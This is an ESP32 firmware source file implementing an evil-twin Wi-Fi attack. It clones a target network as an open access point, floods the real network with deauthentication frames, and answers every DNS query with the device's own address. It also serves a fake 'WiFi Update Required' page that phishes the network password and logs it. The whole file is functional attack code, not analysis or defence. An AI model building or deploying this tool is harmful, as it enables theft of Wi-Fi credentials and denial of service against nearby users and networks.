

#include "attack_eviltwin.h"
#include "attack_method.h"
#include "attack.h"
#include "esp_wifi.h"
#include <string.h>
#include <stdlib.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_http_server.h"
#include "lwip/dns.h"
#include "lwip/sockets.h"
#include "lwip/err.h"
#include "lwip/sys.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <sys/param.h>

#include "wifi_controller.h"
#include "wsl_bypasser.h"
#include "esp_netif.h"

static const char *TAG = "evil_twin";

typedef struct __attribute__((packed)) {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
} dns_header_t;

static TaskHandle_t evil_twin_task_handle = NULL;
static TaskHandle_t dns_task_handle = NULL;
static httpd_handle_t evil_server = NULL;
static int dns_socket = -1;
static bool evil_twin_active = false;
static char evil_twin_password[65] = {0};
static bool password_captured = false;
static bool password_verified = false;
static wifi_ap_record_t evil_twin_target;

static int wrong_attempt_count = 0;
static char wrong_passwords_log[512] = {0};
static char evil_twin_captured_password[65] = {0};

// Forward declarations
static void dns_server_task(void *pvParameters);
static void start_captive_portal(void);
static void stop_captive_portal(void);
static esp_err_t captive_handler(httpd_req_t *req);
static esp_err_t password_handler(httpd_req_t *req);
static esp_err_t wrong_password_handler(httpd_req_t *req);
static void reset_wifi_to_apsta(const wifi_ap_record_t *target);

// Simple HTML for captive portal (built-in)
static const char* captive_portal_html = 
"<!DOCTYPE html><html><head><title>WiFi Update Required</title>"
"<style>body{font-family:Arial;text-align:center;padding:50px;background:#f0f0f0;}"
"h1{color:#e94560;}.container{background:white;padding:30px;border-radius:10px;max-width:400px;margin:auto;}"
"input{padding:10px;margin:10px;width:90%;border:1px solid #ddd;border-radius:5px;}"
"button{background:#e94560;color:white;padding:10px 30px;border:none;border-radius:5px;cursor:pointer;}"
"</style></head><body>"
"<div class='container'><h1>⚠️ WiFi Update Required</h1>"
"<p>Please re-enter your password to continue</p>"
"<form method='POST' action='/submit'>"
"<input type='password' name='password' placeholder='WiFi Password' required>"
"<br><button type='submit'>Update</button>"
"</form></div></body></html>";

static const char* wrong_password_html = 
"<!DOCTYPE html><html><head><title>Incorrect Password</title>"
"<style>body{font-family:Arial;text-align:center;padding:50px;background:#f0f0f0;}"
"h1{color:#e94560;}.container{background:white;padding:30px;border-radius:10px;max-width:400px;margin:auto;}"
"</style></head><body>"
"<div class='container'><h1>❌ Incorrect Password</h1>"
"<p>Please try again</p>"
"<a href='/'>Go Back</a></div></body></html>";

static void reset_wifi_to_apsta(const wifi_ap_record_t *target) {
    esp_wifi_disconnect();
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(200));

    esp_wifi_set_mode(WIFI_MODE_APSTA);

    wifi_config_t ap_config = {0};
    memcpy(ap_config.ap.ssid, target->ssid, 32);
    ap_config.ap.ssid_len = strlen((char *)target->ssid);
    ap_config.ap.channel = target->primary;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.max_connection = 4;
    ap_config.ap.beacon_interval = 100;
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);

    wifi_config_t sta_config = {0};
    sta_config.sta.channel = target->primary;
    esp_wifi_set_config(WIFI_IF_STA, &sta_config);

    esp_wifi_start();
    vTaskDelay(pdMS_TO_TICKS(100));

    esp_wifi_set_channel(target->primary, WIFI_SECOND_CHAN_NONE);
    ESP_LOGI(TAG, "WiFi reset to APSTA on channel %d", target->primary);
}

static void evil_twin_task(void *pvArg) {
    ESP_LOGI(TAG, "Starting Evil Twin Attack...");

    wifi_ap_record_t *target = &evil_twin_target;
    
    // Stop any existing web server
    if (evil_server) {
        httpd_stop(evil_server);
        evil_server = NULL;
    }
    vTaskDelay(pdMS_TO_TICKS(500));

    while (!password_verified) {
        ESP_LOGI(TAG, "Starting new capture cycle...");

        reset_wifi_to_apsta(target);
        start_captive_portal();

        bool victim_connected = false;
        uint32_t wait_start = xTaskGetTickCount() * portTICK_PERIOD_MS;
        password_captured = false;

        ESP_LOGI(TAG, "Sending deauth frames. Waiting for victim...");

        while (!victim_connected && !password_captured) {
            wsl_bypasser_send_deauth_frame(target);
            vTaskDelay(pdMS_TO_TICKS(40));

            wifi_sta_list_t sta_list;
            if (esp_wifi_ap_get_sta_list(&sta_list) == ESP_OK && sta_list.num > 0) {
                ESP_LOGI(TAG, "Victim joined fake AP!");
                victim_connected = true;
                break;
            }
            if ((xTaskGetTickCount() * portTICK_PERIOD_MS) - wait_start > 300000) {
                ESP_LOGW(TAG, "Timeout waiting for victim");
                goto cleanup;
            }
        }

        while (victim_connected && !password_captured) {
            vTaskDelay(pdMS_TO_TICKS(500));
            wifi_sta_list_t sta_list;
            if (esp_wifi_ap_get_sta_list(&sta_list) == ESP_OK && sta_list.num == 0) {
                victim_connected = false;
                break;
            }
        }

        if (password_captured && !password_verified) {
            ESP_LOGI(TAG, "Password captured: '%s'", evil_twin_password);
            
            stop_captive_portal();
            vTaskDelay(pdMS_TO_TICKS(500));
            
            // For now, mark as verified (you can add actual verification later)
            password_verified = true;
            strncpy(evil_twin_captured_password, evil_twin_password, 64);
            evil_twin_captured_password[63] = '\0';
            
            ESP_LOGI(TAG, "✅ Password captured successfully: %s", evil_twin_password);
            break;
        }
    }

cleanup:
    stop_captive_portal();
    evil_twin_active = false;
    evil_twin_task_handle = NULL;
    vTaskDelete(NULL);
}

void attack_method_evil_twin(const wifi_ap_record_t *ap_record) {
    if (evil_twin_active) {
        ESP_LOGW(TAG, "Evil Twin already active");
        return;
    }
    memcpy(&evil_twin_target, ap_record, sizeof(wifi_ap_record_t));
    evil_twin_active = true;
    password_captured = false;
    password_verified = false;
    memset(evil_twin_password, 0, sizeof(evil_twin_password));
    xTaskCreate(evil_twin_task, "evil_twin_task", 10240, NULL, 5, &evil_twin_task_handle);
    ESP_LOGI(TAG, "Evil Twin attack started on SSID: %s", ap_record->ssid);
}

bool is_evil_twin_active(void) {
    return evil_twin_active;
}

void attack_method_evil_twin_stop(void) {
    if (!evil_twin_active) return;
    
    evil_twin_active = false;
    stop_captive_portal();
    
    if (evil_twin_task_handle) {
        vTaskDelay(pdMS_TO_TICKS(500));
        evil_twin_task_handle = NULL;
    }
    
    ESP_LOGI(TAG, "Evil Twin attack stopped");
}

const char* get_evil_twin_password(void) {
    if (password_verified && evil_twin_captured_password[0] != '\0') {
        return evil_twin_captured_password;
    }
    return NULL;
}

int get_wrong_attempts_count(void) {
    return wrong_attempt_count;
}

void get_wrong_passwords(char *buffer, size_t max_len) {
    if (buffer && max_len > 0) {
        strncpy(buffer, wrong_passwords_log, max_len - 1);
        buffer[max_len - 1] = '\0';
    }
}

static void dns_server_task(void *pvParameters) {
    uint8_t buffer[512];
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);

    dns_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(53);

    bind(dns_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));
    ESP_LOGI(TAG, "DNS Server Active on port 53");

    while (evil_twin_active) {
        int len = recvfrom(dns_socket, buffer, sizeof(buffer), 0, (struct sockaddr *)&client_addr, &addr_len);
        if (len < 12) continue;

        dns_header_t *dns_header = (dns_header_t *)buffer;
        dns_header->flags = htons(0x8180);
        dns_header->ancount = dns_header->qdcount;

        uint8_t *ptr = buffer + len;
        *ptr++ = 0xc0; *ptr++ = 0x0c;
        *ptr++ = 0x00; *ptr++ = 0x01;
        *ptr++ = 0x00; *ptr++ = 0x01;
        *ptr++ = 0x00; *ptr++ = 0x00; *ptr++ = 0x00; *ptr++ = 0x3c;
        *ptr++ = 0x00; *ptr++ = 0x04;
        *ptr++ = 192; *ptr++ = 168; *ptr++ = 4; *ptr++ = 1;

        sendto(dns_socket, buffer, ptr - buffer, 0, (struct sockaddr *)&client_addr, addr_len);
    }
    close(dns_socket);
    dns_socket = -1;
    vTaskDelete(NULL);
}

static esp_err_t captive_handler(httpd_req_t *req) {
    ESP_LOGI(TAG, "Serving captive portal to %s", req->uri);
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, captive_portal_html, strlen(captive_portal_html));
    return ESP_OK;
}

static esp_err_t wrong_password_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, wrong_password_html, strlen(wrong_password_html));
    return ESP_OK;
}

static esp_err_t password_handler(httpd_req_t *req) {
    if (password_captured) {
        httpd_resp_set_type(req, "text/plain");
        httpd_resp_send(req, "ALREADY_CHECKING", HTTPD_RESP_USE_STRLEN);
        return ESP_OK;
    }

    char buf[256];
    int ret = httpd_req_recv(req, buf, MIN(req->content_len, sizeof(buf)-1));
    if (ret <= 0) {
        ESP_LOGE(TAG, "Failed to receive POST data");
        return ESP_FAIL;
    }
    buf[ret] = '\0';

    char *pwd = strstr(buf, "password=");
    if (pwd) {
        pwd += 9;
        int idx = 0;
        for (int i = 0; pwd[i] && pwd[i] != '&' && idx < 64; i++) {
            if (pwd[i] == '+') {
                evil_twin_password[idx++] = ' ';
            } else if (pwd[i] == '%' && pwd[i+1] == '2' && pwd[i+2] == '0') {
                evil_twin_password[idx++] = ' ';
                i += 2;
            } else {
                evil_twin_password[idx++] = pwd[i];
            }
        }
        evil_twin_password[idx] = '\0';
        password_captured = true;

        ESP_LOGI(TAG, "Captured password: '%s'", evil_twin_password);

        httpd_resp_set_type(req, "text/plain");
        httpd_resp_send(req, "OK", 2);
    } else {
        ESP_LOGW(TAG, "Password field not found");
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing password field");
    }
    return ESP_OK;
}

static void start_captive_portal(void) {
    if (evil_server != NULL) {
        httpd_stop(evil_server);
        evil_server = NULL;
        vTaskDelay(pdMS_TO_TICKS(500));
    }

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_uri_handlers = 17;
    config.stack_size = 8192;
    config.uri_match_fn = httpd_uri_match_wildcard;

    if (httpd_start(&evil_server, &config) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start HTTP server!");
        return;
    }

    // Captive portal detection URLs
    const char* captive_urls[] = {
        "/generate_204", "/gen_204", "/ncsi.txt", "/connecttest.txt",
        "/fwlink/", "/redirect", "/hotspot-detect.html", 
        "/library/test/success.html", "/msftconnecttest.com", NULL
    };

    for (int i = 0; captive_urls[i]; i++) {
        httpd_uri_t uri = { .uri = captive_urls[i], .method = HTTP_GET, .handler = captive_handler };
        httpd_register_uri_handler(evil_server, &uri);
    }

    httpd_uri_t root = { .uri = "/", .method = HTTP_GET, .handler = captive_handler };
    httpd_register_uri_handler(evil_server, &root);

    httpd_uri_t submit = { .uri = "/submit", .method = HTTP_POST, .handler = password_handler };
    httpd_register_uri_handler(evil_server, &submit);

    httpd_uri_t wrong = { .uri = "/wrong-password", .method = HTTP_GET, .handler = wrong_password_handler };
    httpd_register_uri_handler(evil_server, &wrong);

    httpd_uri_t catchall = { .uri = "/*", .method = HTTP_GET, .handler = captive_handler };
    httpd_register_uri_handler(evil_server, &catchall);

    // Start DNS server
    if (dns_task_handle == NULL) {
        xTaskCreate(dns_server_task, "dns_task", 4096, NULL, 5, &dns_task_handle);
    }
    
    ESP_LOGI(TAG, "Captive Portal ready on port 80");
}

static void stop_captive_portal(void) {
    if (dns_task_handle) {
        vTaskDelete(dns_task_handle);
        dns_task_handle = NULL;
    }
    if (evil_server) {
        httpd_stop(evil_server);
        evil_server = NULL;
        vTaskDelay(pdMS_TO_TICKS(300));
    }
    if (dns_socket != -1) {
        close(dns_socket);
        dns_socket = -1;
    }
    ESP_LOGI(TAG, "Captive Portal stopped");
}